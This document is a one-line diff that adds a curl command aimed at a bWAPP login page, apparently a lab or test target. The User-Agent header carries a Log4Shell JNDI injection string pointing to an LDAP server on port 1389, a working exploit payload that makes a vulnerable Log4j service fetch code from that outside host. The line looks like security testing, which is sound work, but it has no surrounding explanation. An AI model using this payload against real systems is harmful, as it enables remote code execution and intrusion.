@@ -1,0 +1,1 @@
+curl -k --resolve curl.ncurity.com:80:192.168.41.91 "http://curl.ncurity.com/bWAPP/login.php" -H "User-Agent: ${jndi:ldap://192.168.1.1:1389/Test}"
